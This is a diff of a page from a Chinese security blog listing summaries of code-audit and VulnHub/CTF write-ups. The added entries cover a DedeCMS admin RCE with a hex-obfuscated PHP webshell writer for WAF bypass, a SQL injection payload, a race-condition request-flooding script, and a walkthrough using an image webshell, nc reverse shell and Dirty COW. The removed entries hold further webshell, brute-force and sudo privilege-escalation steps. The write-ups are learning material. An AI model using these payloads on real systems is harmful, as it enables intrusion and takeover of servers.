@@ -110,6 +110,95 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/">代码审计-DedeCMS v5.7</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div><div class="content">环境搭建 这里下的源码 http://m.dedemao.com/view/2417某些版本有坑，后台登录为空，没有成功解决
+这个版本可以
+后台RCE 漏洞影响版本： &lt;=DedeCMS v5.7.105
+漏洞复现 登录后台 新建模板
+&lt;?php &#34;\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73&#34;(&#39;./shell.php&#39;, &#34;&lt;?php eva&#34; . &#34;l&#34; . &#34;(&#34; . &#34;$&#34; . &#34;_GE&#34; . &#34;T[1]);&#34;); 其实就是 file_put_contents('./shell.php', &quot;&lt;?php eval($_GET[1]);&quot;); ，为了绕waf
+把这个内容新建到1.htm 模板里
+然后新建页面，模板就引用1.htm ，新建文件用php后缀，这里会把htm文件里的内容写入到新建的php文件里
+成功后我们就得到了一个1.php文件，去访问一下，就可以执行代码 写入shell.php文件
+http://localhost:884/a/1.php 这里注意php的版本啊，刚开始用的5.6会报错，7以上应该可以
+至此我们任意文件写入 就达到了
+漏洞分析 可以看到新建模板的href 是tpl.php
+模板创建 并没有严格check内容 模板结尾必须是.htm，一些表单标签的关键字进行了替换
+更前面的版本是没有过滤的，比如我这个，可以直接创建一个shell文件
+&lt;=DedeCMS v5.7.105 会有过滤, 通过上面的绕过方法也能绕过了
+/* (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\*和 \*/表示分别匹配开头的 &#34;/&#34; 和结尾的 &#34;/&#34; 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &#34;/&#34; 开头、以 &#34;/&#34; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */ $content = preg_replace(&#34;#(/\*)[\s\S]*(\*/)#i&#34;, &#39;&#39;, $content); // 黑名单正则匹配，禁了下面这些函数 global $cfg_disable_funs; $cfg_disable_funs = isset($cfg_disable_funs) ?</div><div class="post-footer">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php/">Php</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/">代码审计-熊海cms_V1.0</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div><div class="content">本地环境搭建 https://article.itxueyuan.com/2dqxD2不赘述了，很坑的一点是网上的文章说php7以下可以，但是我用php5.4一直不行，最后换了5.6可以了
+漏洞发现 可以用seay来匹配一下危险函数
+Rips扫描
+这次也试试Kunlun-M白盒审计工具 https://github.com/LoRexxar/Kunlun-M代码审计 首先我在web目录里创建了一个phpinfo.php文件 来进行测试
+index.php 文件包含 可以看到seay第一个扫出来的就是这个点
+&lt;?php //单一入口模式 error_reporting(0); //关闭错误显示 $file=addslashes($_GET[&#39;r&#39;]); //接收文件名 $action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于index include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件 ?&gt; get传参文件名到$action变量，然后include进行files文件夹下的文件包含，来进行网页跳转
+变量是没有任何过滤的，明显文件名可以目录穿越
+admin/index.php中同理
+SQL注入 后台 看见扫描出来的sql注入还是挺多的，看看
+admin/files/login.php
+就是没有任何过滤，然后die了错误信息回显
+报错注入可以
+user=admin&#39; or updatexml(1,concat(0x7e,(select version()),0x7e),1);# 测试了一下时间盲注也可以
+admin/files里的文件大都是有这种没丝毫过滤的sql注入，不赘述了
+SQL注入 前台 files/content.php
+这里面倒是做了一点处理，addslashes()进行转义
+但是
+默认情况下，PHP 指令 magic_quotes_gpc 为 on，对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。
+这也有点小离谱哈哈哈
+所以这里的转义可能是没有用的
+/install/index.php里面
+反射型XSS $page=addslashes($_GET[&#39;page&#39;]); if ($page&lt;&gt;&#34;&#34;){ if ($page&lt;&gt;1){ $pages=&#34;第&#34;.$page.&#34;页 - &#34;; } &lt;?</div><div class="post-footer">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php/">Php</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">前言 之前一直没有专门找时间分析条件竞争是什么，也只是浅显的认为跟文件包含有些关系，还是主要通过ctfshow的文件包含来了解的。还是有必要捋一下条件竞争这个东西。
+什么是条件竞争 看大家写的专业点的术语大概是条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。
+通俗一点的解释也有群友在讲条件竞争 好比有人问你两句话 第一句“你有没有男朋友” 如果你回答没有 他会说第二句“现在我是你男朋友了” 但是 加入100个男人一次一次的问 你只会有一个男朋友， 100个男人同时问 只要你能同时回答100个 你就有100个男朋友了
+假设程序同时处理存钱和取钱，当取钱&quot;速度&quot;大于存钱时，可能就会出现取钱后程序还未来得及将金额减少，程序又立马处理存钱，由此产生非预期的结果
+我觉得还挺好理解的。
+例题Hgame2023 Hgame2023 中出现一道条件竞争的题目，很好的利用了这个思路
+我有10元，但是flag需要10000000000元
+可以简单粗暴地使用条件竞争,直接重复买Flag10000次，就赌服务器检查不过来
+import requests import threading def req(): url = &#39;http://week-3.hgame.lwsec.cn:31111/api/v1/user/buyProduct?product=Flag&amp;number=1&#39; headers = { &#39;Cookie&#39;:&#39;SESSION=MTY3NTE4OTc0NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwQnP1C-gBhrFuG-GFI2yGPc3QsG0CSUEHeRahONCVOxw==; session=MTY3NTE5MzMxMHxEdi1CQkFFQ180SUFBUkFCRUFBQUtQLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dJQUFZeE1qTTBOVFk9fKDfSi3Bd18TAleiQIVGKj5Tlcxs4toyGz3e-eLGoGRV&#39; } r = requests.get(url=url, headers=headers) for i in range(10000): threading.Thread(target=req).start() 10000次 竞争，成功竞争出去了一百多次
+例题 1.文件上传+条件竞争 一般是上传文件，绕过防护之后，小马又会被立马删除。但是由于文件存在过，我们可以利用python脚本不断访问shell，这样就形成了python脚本和web删除程序之间的竞争，一定的测试量后，可以竞争到资源，执行shell，从而得到flag。
+https://co0ontty.github.io/2019/04/12/batterupload.html这个文章的例题挺清晰的
+burpsuit的攻击模块多线程不断发包，以达到我们的预期效果。
+2.session文件包含+条件竞争 这是我想学习的重点了 ,是通过ctfshow的web82来进行了解 https://www.bilibili.com/video/BV1P64y1Q72q?p=5&vd_source=cf73ac8de9b7c0322b1bccf77de91c5d先了解一下基础的前置知识：
+在cookie中设置 PHPSESSION=aaa 则会生成一个临时文件 /tmp/sess_aaa ，所以我们可控文件名
+文件内容如何控制？用PHP_SESSION_UPLOAD_PRGRESS参数
+PHP_SESSION_UPLOAD_PRGRESS参数的值为123，则 /tmp/sess_aaa的内容为123，则文件内容可控制
+由此原理我们可以写进shell然后rce
+首先通过PHP_SESSION_UPLOAD_PRGRESS在/tmp/sess_xxxx中写入一个shell</div><div class="post-footer">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/">VulnHub — CH4INRULZ_v1.0.1</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — CH4INRULZ_v1.0.1 扫描ip和端口 nmap 192.168.164.0/24 可以用dirb 扫描.bak备份文件 dirb http://192.168.164.137/ -x .bak curl直接读文件
+curl http://192.168.164.137/index.html.bak &amp;lt;!-- 我将使用 frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 作为 .htpasswd 文件来保护开发路径 --&amp;gt; 用join来解密 这是个用户名和密码
+frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
+将串字符保存到1.txt 然后john工具爆破密码 john 1.txt john 1.txt --show 得到一组用户名和密码， frank frank!!!
+登录刚才的development目录 ，成功登录
+然后有提示 uploader目录需要安全审查 访问后可以上传图片
+传上图片马（构造的gif图片） 显示成功上传，但是不知道路径
+8011端口收集信息 能够上传图片马，但不知道路径，这时候选择回头看看8011端口 扫目录看到api目录 访问/api 正在开发的api接口， 猜测files_api.php 可以文件读取
+没有file参数发送给我 ，所以猜测这里可以传file参数,尝试了一下是post传参 那么post传file参数可以进行文件读取 刚才上传文件后在/development/uploader/upload.php有回显，尝试读取这个upload.php
+并没有读取出源码，而是执行了php文件 这里继续用filter伪协议进行读取 ，成功得到源码 FRANKuploads/ 得到上传文件存储路径
+nc 反弹shell nc 先监听webshell里设置的4444端口
+文件读取刚刚上传的webshell.gif ，成功让gif文件以PHP执行
+反弹shell 成功
+www-data权限 脏牛提权 内核版本&gt;2.4.22 。2016年之前 都可以脏牛提权 版本符合</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/">VulnHub — DC-1</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — DC-1 信息收集 主机发现 不清楚什么原因，这个靶机的ip一直扫不到 偶尔又扫到了，不知道什么问题
@@ -136,45 +225,6 @@ nmap -A 192.168.164.133 -p 0-65535 可以看到1898端口也是http服务
 得到框架的版本信息 Drupal 7.54 漏洞发发现与利用 msfconsole 使用 1.搜索利用脚本: search2.进入利用脚本: use exploit/unix/ftp/proftpd_133c_backdoor3.查看需要设置的参数: show options4.设置参数: set rhost 192.168.1.45.设置payload: set payload cmd/unix/reverse6.查看payload需要设置的参数: show options7.设置payload参数:set rhost 192.168.1.48.输入命令: run, 执行攻击，成功getshell, 井且直接为root权限 1，搜索脚本 search 2，利用脚本 use 3，查看需要参数 show options</div><div class="post-footer">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--lampiao/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/">VulnHub — Me-and-My-Girlfriend-1</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — Me-and-My-Girlfriend-1 安装好靶场镜像，打开就这样
-在kali 查自己ip 用 nmap扫描 ，看有没有其他段 ，顺利找到靶场ip
-然后访问靶场ip ，查看源码 源码提示，用X-Forwarded-For 修改成 本地ip ，直接用插件改了
-顺利进入网站 ​​​
-进入注册页面，成功注册，然后进行登录
-登录进来，观察到这里可以修改 user_id的号， 修改试试
-试出来5时候，名字是alice ，正是本题女主的名字 F12成功看到密码 用ssh 命令 进行远程登录
-格式如下，密码输入以上密码就可，然后成功连接，可以操作了 隐藏文件有个 my_secret ,访问进去 继续查看
-成功看到flag1.txt ，获得第一个flag
-这题还需要提权，查看alice的权限 ，需要用php 提权
-php 回调bash提权 sudo php -r &#39;system(&#34;/bin/bash&#34;);&#39; 权限 升为 root ，直接find flag文件啦</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/">VulnHub — mrRobot1</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — mrRobot1 信息收集 nmap 192.168.164.0/24 22端口被关闭了 访问80网站，很像一个终端的页面
-访问robots.txt拿到第一个flag
-还有一个dic文件，访问下载下来是个字典文件
-扫描目录 发现有wordpress后台页面 sort 排序 -u 去重 sort -u fsocity.dic &amp;gt; dic.txt 将其保存为新的字典 ，去登录页面尝试用户名和密码的爆破
-用户名密码爆破 直接用burp来爆破 先爆用户名 得到是elliot
-爆出密码ER28-0652 成功登录后台 WordPress后台反弹shell 1.wordpress后台登录地址http://192.168.164.138/wordpress/wp-admin2.修改404页面，写入webshell （自行设置监听IP和端口）appearance----editer----404.php3.在攻击机上面开启监听4444端口 nc -lvpp 4444.访问404页面，反向连接到主机 （404地址固定）http://192.168.164.138/wordpress/wp-content/themes/twentyfifteen/404.php5.交互式连接python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入后台 找到编辑404页面 将webshell脚本写进去 保存 nc -lvvp 4444 然访问404.php
-连接成功 交互式连接 python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入home目录 就有个robot用户
-进入 发现有flag 但是没有权限查看 还有一个password MD5加密的 可以读取到 这个md5直接拿去解密</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">VulnHub — NARAK</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — NARAK Objective: Find 2 flags (user.txt and root.txt)
-nmap 扫出来靶场ip 和开放端口 浏览器访问 ，一堆这个关于题目背景的地狱图片 ，没有什么信息
-扫描一下目录 ，dirsearch 和 dirb都用了一下 ，dirmap倒是没出来
-访问webdav 有东西 **cadaver —— webdav客户端使用 ** cadaver http://192.168.164.130/webdav //连接put webshell.php //上传 cewl —— 爬行网站创建密码字典 通过爬取网站获得关键词信息，创建一个密码字典cewl http://192.168.164.130/ -w 1.txt hydra —— 爆破神器，支持众多协议的自动化爆破 hydra -L 1.txt -P 1.txt 192.168.164.130 http-get /webdav -L 用户名 -P 密码 ip地址 协议 路径 爆破出 用户名密码了，就可以cadaver 进行连接了 连接上，可以 put 一个 webshell ，成功后
-nc ——监听 nc -lvvp 4444(webshell设置端口) 然后用刚才的用户名密码 登录这个webshell</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -192,6 +242,10 @@ nc ——监听 nc -lvvp 4444(webshell设置端口) 然后用刚才的用户名�
                 </li><li class="page-item active">
                     <span class="page-link">
                         <a href="/page/8/">8</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/9/">9</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
